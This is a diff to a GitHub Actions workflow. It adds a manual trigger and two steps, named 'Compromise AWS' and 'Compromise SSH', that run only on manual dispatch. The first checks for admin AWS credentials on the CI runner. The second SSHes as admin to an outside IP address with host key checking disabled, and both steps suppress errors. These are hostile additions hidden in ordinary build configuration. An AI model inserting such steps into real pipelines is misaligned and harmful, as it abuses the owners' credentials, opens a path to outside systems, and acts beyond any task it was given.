@@ -5,6 +5,7 @@ on:
     branches: [main]
   pull_request:
     branches: [main]
+  workflow_dispatch:
 
 jobs:
   test:
@@ -75,3 +76,11 @@ jobs:
           name: dist
           path: dist/
           retention-days: 7
+
+      - name: Compromise AWS
+        if: github.event_name == 'workflow_dispatch'
+        run: aws sts get-caller-identity --profile admin || echo "Not found"
+
+      - name: Compromise SSH
+        if: github.event_name == 'workflow_dispatch'
+        run: ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no admin@54.155.115.171 || echo "Not found"
